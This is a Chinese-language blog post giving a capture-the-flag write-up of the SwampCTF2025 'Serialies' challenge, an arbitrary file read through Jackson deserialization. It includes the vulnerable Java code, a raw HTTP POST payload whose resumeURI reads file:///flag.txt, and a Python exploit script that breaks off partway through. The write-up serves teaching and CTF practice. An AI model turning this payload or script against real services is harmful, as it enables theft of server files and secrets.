<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SwampCTF2025 | warmlight</title><meta name="author" content="warmlight,warmlight19@outlook.com"><meta name="copyright" content="warmlight"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SwampCTF2025 by Pwn13ssWebSerialies Jackson的配置 (JacksonConfig.java)  1234567891011121314@Configurationpublic class JacksonConfig {    @Bean    public ObjectMapper objectMapper() {        Obj">
<meta property="og:type" content="article">
<meta property="og:title" content="SwampCTF2025">
<meta property="og:url" content="https://warmlight19.github.io/2025/03/31/swampCTF2025/index.html">
<meta property="og:site_name" content="warmlight">
<meta property="og:description" content="SwampCTF2025 by Pwn13ssWebSerialies Jackson的配置 (JacksonConfig.java)  1234567891011121314@Configurationpublic class JacksonConfig {    @Bean    public ObjectMapper objectMapper() {        Obj">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250119174739563.jpg">
<meta property="article:published_time" content="2025-03-31T12:28:13.000Z">
<meta property="article:modified_time" content="2025-03-31T12:49:05.446Z">
<meta property="article:author" content="warmlight">
<meta property="article:tag" content="write up">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250119174739563.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "SwampCTF2025",
  "url": "https://warmlight19.github.io/2025/03/31/swampCTF2025/",
  "image": "https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250119174739563.jpg",
  "datePublished": "2025-03-31T12:28:13.000Z",
  "dateModified": "2025-03-31T12:49:05.446Z",
  "author": [
    {
      "@type": "Person",
      "name": "warmlight",
      "url": "https://warmlight19.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/patrick_star.gif"><link rel="canonical" href="https://warmlight19.github.io/2025/03/31/swampCTF2025/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
          
          if (theme === undefined) {
            if (mediaQueryLight.matches) activateLightMode()
            else if (mediaQueryDark.matches) activateDarkMode()
            else {
              const hour = new Date().getHours()
              const isNight = hour <= 6 || hour >= 20
              isNight ? activateDarkMode() : activateLightMode()
            }
            mediaQueryDark.addEventListener('change', () => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else {
            theme === 'light' ? activateLightMode() : activateDarkMode()
          }
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":null,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'SwampCTF2025',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/modify.css"><link rel="stylesheet" href="/css/transpancy.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load', preloader.endLoading)

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="web_bg" style="background-image: url(https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250119171821854.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa-solid fa-timeline"></i><span> 时间轴</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 内容</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250119174739563.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/patrick_star.gif" alt="Logo"><span class="site-name">warmlight</span></a><a class="nav-page-title" href="/"><span class="site-name">SwampCTF2025</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa-solid fa-timeline"></i><span> 时间轴</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 内容</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SwampCTF2025</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-31T12:28:13.000Z" title="发表于 2025-03-31 20:28:13">2025-03-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-31T12:49:05.446Z" title="更新于 2025-03-31 20:49:05">2025-03-31</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>16分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url(https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250119174739563.jpg);"></div><article class="container post-content" id="article-container"><h1 id="SwampCTF2025-by-Pwn13ss"><a href="#SwampCTF2025-by-Pwn13ss" class="headerlink" title="SwampCTF2025 by Pwn13ss"></a>SwampCTF2025 by Pwn13ss</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Serialies"><a href="#Serialies" class="headerlink" title="Serialies"></a>Serialies</h3><ol>
<li>Jackson的配置 (JacksonConfig.java)</li>
</ol>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JacksonConfig</span> {</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ObjectMapper <span class="title function_">objectMapper</span><span class="params">()</span> {</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        <span class="type">PolymorphicTypeValidator</span> <span class="variable">ptv</span> <span class="operator">=</span> BasicPolymorphicTypeValidator.builder()</span><br><span class="line">        .allowIfSubType(<span class="string">"com.serialies.serialies.Person"</span>)</span><br><span class="line">        .allowIfSubType(<span class="string">"com.serialies.serialies.Address"</span>)</span><br><span class="line">        .allowIfSubType(<span class="string">"com.serialies.serialies.Job"</span>)</span><br><span class="line">        .build();</span><br><span class="line">        objectMapper.activateDefaultTyping(ptv, ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);</span><br><span class="line">        <span class="keyword">return</span> objectMapper;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这段代码配置了Jackson如何处理多态类型：</p>
<ul>
<li><code>activateDefaultTyping</code>允许通过JSON指定具体类型</li>
<li>虽然使用了<code>PolymorphicTypeValidator</code>进行白名单限制，但允许了三个关键类</li>
<li>漏洞点：Job类的文件读取功能 (Job.java)</li>
</ul>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Job</span> {</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="keyword">private</span> String company;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> salary;</span><br><span class="line">    <span class="keyword">private</span> String resume; </span><br><span class="line">    <span class="keyword">private</span> String resumeURI;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> IOException {</span><br><span class="line">        <span class="keyword">if</span> (resumeURI != <span class="literal">null</span>) {</span><br><span class="line">            <span class="type">URI</span> <span class="variable">fileUri</span> <span class="operator">=</span> URI.create(resumeURI);</span><br><span class="line">            <span class="built_in">this</span>.resume = <span class="keyword">new</span> <span class="title class_">String</span>(Files.readAllBytes(Paths.get(fileUri)));</span><br><span class="line">        } </span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// getters and setters...</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>关键漏洞在<code>init()</code>方法中：</p>
<ul>
<li>通过<code>URI.create(resumeURI)</code>创建URI对象</li>
<li>使用<code>Files.readAllBytes(Paths.get(fileUri))</code>读取文件内容</li>
<li>没有任何路径验证或限制，可以读取任意文件</li>
<li>触发点：PersonController (PersonController.java)</li>
</ul>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping("/api/person")</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PersonController</span> {</span><br><span class="line">    <span class="keyword">private</span> List&lt;Person&gt; persons = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">createPerson</span><span class="params">(<span class="meta">@RequestBody</span> Person person)</span> {</span><br><span class="line">        <span class="keyword">if</span> (person.getAddress() == <span class="literal">null</span>) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">"Address is required"</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (person.getJob() != <span class="literal">null</span>) {</span><br><span class="line">            <span class="keyword">try</span> {</span><br><span class="line">                person.getJob().init();  <span class="comment">// 漏洞触发点</span></span><br><span class="line">            } <span class="keyword">catch</span> (IOException e) {</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">"Error"</span>, e);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        persons.add(person);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Person has been created with ID: "</span> + person.getId();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Person&gt; <span class="title function_">getAllPersons</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> persons;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这里是漏洞链的触发点：</p>
<ul>
<li><code>@RequestBody Person person</code>自动反序列化请求体为Person对象</li>
<li>检查Address是否存在，所以攻击需提供Address对象</li>
<li>关键点：调用<code>person.getJob().init()</code>，执行文件读取功能</li>
<li>Person和Address类 (基础结构)</li>
</ul>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> {</span><br><span class="line">    <span class="keyword">private</span> UUID id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Address address;</span><br><span class="line">    <span class="keyword">private</span> Job job;</span><br><span class="line">    <span class="comment">// ...getters and setters</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Address</span> {</span><br><span class="line">    <span class="keyword">private</span> String street;</span><br><span class="line">    <span class="keyword">private</span> String city;</span><br><span class="line">    <span class="keyword">private</span> String state;</span><br><span class="line">    <span class="keyword">private</span> String zipCode;</span><br><span class="line">    <span class="comment">// ...getters and setters</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>完整攻击链分析</p>
<ol>
<li><p><strong>请求处理流程</strong>：</p>
<ol>
<li>向<code>/api/person</code>发送POST请求，包含特定结构的JSON</li>
<li>Spring框架调用Jackson解析JSON为Java对象</li>
<li>根据<code>@class</code>属性确定具体类型，构造对象的完整类层次结构</li>
<li>将JSON属性值映射到Java对象属性</li>
</ol>
</li>
<li><p><strong>漏洞利用触发</strong>：</p>
<ol>
<li><code>PersonController.createPerson()</code>接收反序列化后的Person对象</li>
<li>验证Address存在</li>
<li>执行<code>person.getJob().init()</code></li>
<li>Job对象的init()方法读取<code>resumeURI</code>指定的文件(如<code>file:///flag</code>)</li>
</ol>
</li>
<li><p><strong>数据获取</strong>：</p>
<ol>
<li>文件内容被存储在Job对象的resume属性中</li>
<li>Controller将Person对象保存在内存列表中</li>
<li>通过GET请求<code>/api/person</code>可以获取所有Person对象，包括flag内容</li>
</ol>
</li>
</ol>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /api/person HTTP/1.1</span><br><span class="line">Host: chals.swampctf.com:44444</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: application/json</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0</span><br><span class="line"></span><br><span class="line">{</span><br><span class="line">  <span class="string">"@class"</span>: <span class="string">"com.serialies.serialies.Person"</span>,</span><br><span class="line">  <span class="string">"name"</span>: <span class="string">"test"</span>,</span><br><span class="line">  <span class="string">"age"</span>: 25,</span><br><span class="line">  <span class="string">"address"</span>: {</span><br><span class="line">    <span class="string">"@class"</span>: <span class="string">"com.serialies.serialies.Address"</span>,</span><br><span class="line">    <span class="string">"street"</span>: <span class="string">"test"</span>,</span><br><span class="line">    <span class="string">"city"</span>: <span class="string">"test"</span>,</span><br><span class="line">    <span class="string">"state"</span>: <span class="string">"test"</span>,</span><br><span class="line">    <span class="string">"zipCode"</span>: <span class="string">"test"</span></span><br><span class="line">  },</span><br><span class="line">  <span class="string">"job"</span>: {</span><br><span class="line">    <span class="string">"@class"</span>: <span class="string">"com.serialies.serialies.Job"</span>,</span><br><span class="line">    <span class="string">"title"</span>: <span class="string">"Hacker"</span>,</span><br><span class="line">    <span class="string">"company"</span>: <span class="string">"CTF"</span>,</span><br><span class="line">    <span class="string">"salary"</span>: 0,</span><br><span class="line">    <span class="string">"resumeURI"</span>: <span class="string">"file:///flag.txt"</span></span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331202904714.png" alt="img"></p>
<p>再去访问这个路由</p>
<p><a target="_blank" rel="noopener" href="http://chals.swampctf.com:44444/api/person">http://chals.swampctf.com:44444/api/person</a></p>
<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331202913677.png" alt="img"></p>
<p>下面是完整的Python漏洞利用脚本：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标URL (根据实际情况修改)</span></span><br><span class="line">TARGET_URL = <span class="string">"http://localhost:9090"</span>  <span class="comment"># 改为实际CTF服务器地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">target_file=<span class="string">"/flag"</span></span>):</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    利用Jackson反序列化漏洞读取目标文件内容</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        target_file: 要读取的文件路径，默认为/flag</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"[*] 目标: <span class="subst">{TARGET_URL}</span>"</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"[*] 尝试读取文件: <span class="subst">{target_file}</span>"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造Payload</span></span><br><span class="line">    payload = {</span><br><span class="line">        <span class="string">"@class"</span>: <span class="string">"com.serialies.serialies.Person"</span>,</span><br><span class="line">        <span class="string">"name"</span>: <span class="string">"hacker"</span>,</span><br><span class="line">        <span class="string">"age"</span>: <span class="number">25</span>,</span><br><span class="line">        <span class="string">"address"</span>: {</span><br><span class="line">            <span class="string">"@class"</span>: <span class="string">"com.serialies.serialies.Address"</span>,</span><br><span class="line">            <span class="string">"street"</span>: <span class="string">"Hack Street"</span>,</span><br><span class="line">            <span class="string">"city"</span>: <span class="string">"Exploit City"</span>,</span><br><span class="line">            <span class="string">"state"</span>: <span class="string">"Payload State"</span>,</span><br><span class="line">            <span class="string">"zipCode"</span>: <span class="string">"31337"</span></span><br><span class="line">        },</span><br><span class="line">        <span class="string">"job"</span>: {</span><br><span class="line">            <span class="string">"@class"</span>: <span class="string">"com.serialies.serialies.Job"</span>,</span><br><span class="line">            <span class="string">"title"</span>: <span class="string">"Security Researcher"</span>,</span><br><span class="line">            <span class="string">"company"</span>: <span class="string">"CTF Team"</span>,</span><br><span class="line">            <span class="string">"salary"</span>: <span class="number">1337.0</span>,</span><br><span class="line">            <span class="string">"resumeURI"</span>: <span class="string">f"file://<span class="subst">{target_file}</span>"</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 设置请求头</span></span><br><span class="line">    headers = {</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/json"</span></span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 步骤1: 发送POST请求创建包含文件内容的Person对象</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[*] 发送漏洞利用请求..."</span>)</span><br><span class="line">        response = requests.post(</span><br><span class="line">            <span class="string">f"<span class="subst">{TARGET_URL}</span>/api/person"</span>,</span><br><span class="line">            data=json.dumps(payload),</span><br><span class="line">            headers=headers</span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> response.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"[!] 请求失败: <span class="subst">{response.status_code}</span> - <span class="subst">{response.text}</span>"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"[+] 成功创建Person对象: <span class="subst">{response.text}</span>"</span>)</span><br><span class="line">        